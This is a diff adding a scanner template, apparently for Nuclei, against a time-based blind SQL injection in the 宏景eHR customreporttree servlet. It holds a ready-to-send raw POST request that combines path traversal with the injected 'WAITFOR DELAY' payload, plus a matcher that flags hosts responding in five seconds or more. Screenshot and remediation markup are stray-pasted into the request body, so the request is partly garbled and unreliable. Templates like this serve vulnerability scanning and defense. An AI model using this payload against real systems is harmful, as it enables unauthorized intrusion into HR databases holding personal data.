@@ -1,0 +1,45 @@
+id: poc-vyrdo0cmrxvxcng2
+info:
+  name: 宏景eHR customreporttree SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vyrdo0cmrxvxcng2
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vyrdo0cmrxvxcng2
+http:
+- raw:
+  - 'POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    id=1'';WAITFOR DELAY ''0:0:5''--+&codeset=UN&priv=1&level=
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717057945146-59124c8a-753d-431f-87ee-b3493a4e1b06.png)
+
+
+    ## 修复建议
+
+    <font style="color:#333333;">1、请联系厂商进行修复或升级到安全版本。
+
+    </font><font style="color:#333333;">2、如非必要，禁止公网访问该系统。
+
+    </font><font style="color:#333333;">3、设置白名单访问。</font>'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
